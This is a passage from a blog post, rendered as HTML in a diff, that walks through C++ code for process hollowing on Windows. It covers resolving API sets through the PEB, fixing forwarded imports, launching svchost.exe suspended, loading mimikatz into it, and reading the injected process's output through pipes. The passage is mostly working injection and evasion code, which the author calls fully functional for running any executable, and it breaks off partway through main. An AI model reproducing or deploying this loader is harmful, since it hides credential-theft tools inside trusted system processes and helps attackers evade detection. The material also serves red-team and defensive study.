+            <span class="n">memcpy</span><span class="p">(</span><span class="n">apiRes</span><span class="p">,</span> <span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueOffset</span><span class="p">),</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueLength</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">==</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">ValueCount</span><span class="p">)</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"%ws "</span><span class="p">,</span> <span class="n">apiRes</span><span class="p">);</span>
+            <span class="k">else</span>
+                <span class="nf">printf</span><span class="p">(</span><span class="s">"%ws, "</span><span class="p">,</span> <span class="n">apiRes</span><span class="p">);</span>
+            <span class="n">ApiValueEntry</span><span class="o">++</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+
+        <span class="n">ApiMapEntry</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><img src="assets/img/posts/20240124/ApiResolution.png" alt="API Set resolution" /></p>
+
+<p>You can find the structures in more details on <a href="https://ntdoc.m417z.com">m417z documentation of Windows Native API</a>.</p>
+
+<p>When we look at API set map, we found out that most of the API set names have only one corresponding DLL. After performing multiple tests, I realised that the edge case where we need to resolve the second DLL instead of the first was very rare. Therefore, to lighten our code we will take the first entry of the API set. However, keep in mind that you can encounter this edge case.</p>
+
+<p>Also the last digit of the api set can differ from the one we are looking for. However, it is still the good resolution. For example: <code class="language-plaintext highlighter-rouge">mimikatz</code> has a forwarded function to the API Set name: <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0</code>. However, when you enumerate your API Set Map, you will find out that the only similar API Set name is <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-3</code>. You will also notice that they resolve to the same DLL name. Therefore, when you resolve an API Set, it is advice to compare the name without the last digit.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">resolveAPISet</span><span class="p">(</span><span class="n">PWCHAR</span> <span class="n">apiToResolve</span><span class="p">,</span> <span class="n">PWCHAR</span><span class="o">&amp;</span> <span class="n">apiResolved</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Retrieve PEB
+</span>
+    <span class="n">PPEB</span> <span class="n">peb</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+    <span class="c1">// Get API SET MAP
+</span>
+    <span class="n">PAPI_SET_NAMESPACE</span> <span class="n">apiMap</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_NAMESPACE</span><span class="p">)</span><span class="n">peb</span><span class="o">-&gt;</span><span class="n">Reserved9</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="n">PWSTR</span> <span class="n">ApiStrName</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
+    <span class="c1">// Get First Entry of API Set Map
+</span>
+    <span class="n">PAPI_SET_NAMESPACE_ENTRY</span> <span class="n">ApiMapEntry</span> <span class="o">=</span> <span class="n">PAPI_SET_NAMESPACE_ENTRY</span><span class="p">(</span><span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">EntryOffset</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">Count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="c1">// -5 because we remove .dll and the last digit
+</span>
+        <span class="c1">// *2 because we have WCHAR
+</span>
+        <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">lstrlenW</span><span class="p">(</span><span class="n">apiToResolve</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="n">ApiStrName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">NameOffset</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">ApiStrName</span><span class="p">,</span> <span class="n">apiToResolve</span><span class="p">,</span><span class="n">len</span> <span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">PAPI_SET_VALUE_ENTRY</span> <span class="n">ApiValueEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_VALUE_ENTRY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">ValueOffset</span><span class="p">);</span>
+            <span class="n">apiResolved</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWCHAR</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueLength</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
+            <span class="n">memcpy</span><span class="p">(</span><span class="n">apiResolved</span><span class="p">,</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueOffset</span><span class="p">),</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueLength</span><span class="p">);</span>
+
+            <span class="n">_dbg</span><span class="p">(</span><span class="s">"ApiSetName: %ws -&gt; ApiResolved: %ws </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">apiToResolve</span><span class="p">,</span> <span class="n">apiResolved</span><span class="p">);</span> 
+            <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">ApiMapEntry</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">_err</span><span class="p">(</span><span class="s">"Error in resolving API Set name: %ws </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">apiToResolve</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Now let’s modify our function <code class="language-plaintext highlighter-rouge">fixImports</code>:</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">fixImports</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">forwardedLib</span> <span class="o">&amp;&amp;</span> <span class="n">forwardedName</span><span class="p">)</span>
+                    <span class="p">{</span>
+
+                        <span class="n">PWSTR</span> <span class="n">forwardedLibWstr</span> <span class="o">=</span> <span class="n">strToWstr</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">);</span>
+
+                        <span class="n">MODULEENTRY32W</span> <span class="n">fwMe32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">forwardedLibWstr</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+                        <span class="p">{</span>
+                            <span class="n">PWSTR</span> <span class="n">apiSetResolved</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
+                            <span class="n">resolveAPISet</span><span class="p">(</span><span class="n">forwardedLibWstr</span><span class="p">,</span> <span class="n">apiSetResolved</span><span class="p">);</span>
+                            <span class="n">fwMe32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">apiSetResolved</span><span class="p">);</span>
+                            <span class="k">if</span> <span class="p">(</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+                            <span class="p">{</span>
+                                <span class="n">_err</span><span class="p">(</span><span class="s">"Error in resolving the forwarded lib %ws</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">forwardedLibWstr</span><span class="p">);</span>
+                                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+                            <span class="p">}</span>
+                        <span class="p">}</span>
+
+                        <span class="n">HMODULE</span> <span class="n">fwLib</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">);</span>
+                        <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">addrFunc</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">fwLib</span><span class="p">;</span>
+                        <span class="n">addrFix</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
+                        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[FORWARDED FUNCTION] %s is a forwarded function in %ws @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">fwMe32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">);</span>
+                    <span class="p">}</span>
+    <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Let’s find out if our mimikatz successfuly works. To test, we will change slightly the function <code class="language-plaintext highlighter-rouge">launchSuspendedProcess</code>, to pass arguments to the command line. We will attempt to create a log file with mimikatz and execute the commands <code class="language-plaintext highlighter-rouge">coffee</code> and <code class="language-plaintext highlighter-rouge">exit</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">launchSusprendedProcess</span><span class="p">(</span><span class="n">LPSTR</span> <span class="n">processName</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span><span class="o">&amp;</span> <span class="n">pi</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcessA</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">svchost.exe </span><span class="se">\"</span><span class="s">log C:</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">test.log</span><span class="se">\"</span><span class="s"> </span><span class="se">\"</span><span class="s">coffee</span><span class="se">\"</span><span class="s"> </span><span class="se">\"</span><span class="s">exit</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="n">pi</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot create process %s"</span><span class="p">,</span> <span class="n">processName</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Launching process %s with PID: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">processName</span><span class="p">,</span> <span class="n">pi</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><img src="assets/img/posts/20240124/PHMimi.png" alt="Execution of mimikatz" /></p>
+
+<p>Now we have a fully functionnal code that allows us to execute any PE through process hollowing technic. But, we would like now to retrieve the output directly in our program.</p>
+
+<h2 id="final-touch-retrieve-output-of-our-injected-process">Final Touch: Retrieve output of our injected process</h2>
+
+<p>Windows created <code class="language-plaintext highlighter-rouge">pipes</code> which is a mechanism used to create interprocess communication. Therefore, we can redirect <code class="language-plaintext highlighter-rouge">stdOut</code> and <code class="language-plaintext highlighter-rouge">stdErr</code> to the created anonymous pipe and then read it.<br />
+First we will modify our <code class="language-plaintext highlighter-rouge">launchSuspendedProcess</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">launchSusprendedProcess</span><span class="p">(</span><span class="n">LPSTR</span> <span class="n">processName</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span><span class="o">&amp;</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">args</span><span class="p">,</span> <span class="n">HANDLE</span><span class="o">&amp;</span> <span class="n">hStdOutPipeRead</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">hStdOutPipeWrite</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">SECURITY_ATTRIBUTES</span> <span class="n">sa</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SECURITY_ATTRIBUTES</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span> <span class="p">};</span>
+    <span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+    <span class="c1">//Creating Pipe for output of exe
+</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreatePipe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hStdOutPipeRead</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hStdOutPipeWrite</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[CMD] Failed Output pipe"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Redirection STDOUT/STDERR into pipe
+</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOA</span><span class="p">);</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESTDHANDLES</span><span class="p">;</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">hStdError</span> <span class="o">=</span> <span class="n">hStdOutPipeWrite</span><span class="p">;</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">hStdOutput</span> <span class="o">=</span> <span class="n">hStdOutPipeWrite</span><span class="p">;</span>
+    <span class="n">PCHAR</span> <span class="n">cmdLine</span> <span class="o">=</span> <span class="n">strConcat</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcessA</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="n">cmdLine</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="n">pi</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot create process %s"</span><span class="p">,</span> <span class="n">processName</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Launching process %s with PID: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">processName</span><span class="p">,</span> <span class="n">pi</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Note that we have created a function used to create a cmdLine by concatenating the process name and the arguments.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">PCHAR</span> <span class="nf">strConcat</span><span class="p">(</span><span class="n">PCHAR</span> <span class="n">str1</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">str2</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">SIZE_T</span> <span class="n">size1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str1</span><span class="p">);</span>
+    <span class="n">SIZE_T</span> <span class="n">size2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str2</span><span class="p">);</span>
+    <span class="n">PCHAR</span> <span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">size1</span> <span class="o">+</span> <span class="n">size2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">out</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">nullptr</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str1</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> 
+    <span class="p">}</span>
+    <span class="n">out</span><span class="p">[</span><span class="n">size1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">' '</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">size1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">str2</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">out</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Now our function will create a pipe and redirect the output to it.<br />
+And then to retrieve the output we will create two functions. One to read from the pipe</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">readPipe</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hPipe</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="n">PDWORD</span> <span class="n">dataLen</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">bytesSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="c1">// first get the size then parse
+</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">PeekNamedPipe</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">bytesSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">_dbg</span><span class="p">(</span><span class="s">"[SMB] BytesSize =&gt; %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">);</span>
+                
+            <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">bytesSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bytesSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">_dbg</span><span class="p">(</span><span class="s">"[SMB] BytesSize Read =&gt; %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">);</span>
+
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+                <span class="n">_err</span><span class="p">(</span><span class="s">"[SMB] ReadFile: Failed[%d]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+                <span class="n">DATA_FREE</span><span class="p">(</span><span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">);</span>
+                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipe</span><span class="p">);</span>
+                <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[SMB] PeekNamedPipe: Failed[%d]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipe</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>And an other that will read fragments of the output until the remote thread finished</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">VOID</span> <span class="nf">retrieveOutput</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">hStdOut</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">PVOID</span> <span class="n">commandOutput</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">bytesSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="o">!=</span> <span class="n">WAIT_OBJECT_0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">readPipe</span><span class="p">(</span><span class="n">hStdOut</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">commandOutput</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesSize</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">bytesSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">commandOutput</span><span class="p">);</span>
+            <span class="n">DATA_FREE</span><span class="p">(</span><span class="n">commandOutput</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">// Reading output one last time to check we don't leave anything behind...
+</span>
+    <span class="n">readPipe</span><span class="p">(</span><span class="n">hStdOut</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">commandOutput</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesSize</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">bytesSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">commandOutput</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Let’s try it now with this main function</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">peInjectNtHeaders</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PROCESS_INFORMATION</span><span class="p">();</span>
+
+    <span class="n">PCHAR</span> <span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="s">"coffee exit"</span><span class="p">;</span>
+    <span class="n">LPCSTR</span> <span class="n">peInject</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">user</span><span class="se">\\</span><span class="s">Downloads</span><span class="se">\\</span><span class="s">mimikatz_trunk</span><span class="se">\\</span><span class="s">x64</span><span class="se">\\</span><span class="s">mimikatz.exe"</span><span class="p">;</span>
+    <span class="n">LPCSTR</span> <span class="n">target</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">svchost.exe"</span><span class="p">;</span>
+
+    <span class="n">LPVOID</span> <span class="n">peToInjectContent</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">peSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    
+    <span class="n">HANDLE</span> <span class="n">hStdOut</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">loadPEFromDisk</span><span class="p">(</span><span class="n">peInject</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">peSize</span><span class="p">))</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">launchSusprendedProcess</span><span class="p">((</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">target</span><span class="p">,</span> <span class="n">pi</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">hStdOut</span><span class="p">))</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">retrieveNtHeaders</span><span class="p">(</span><span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">))</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
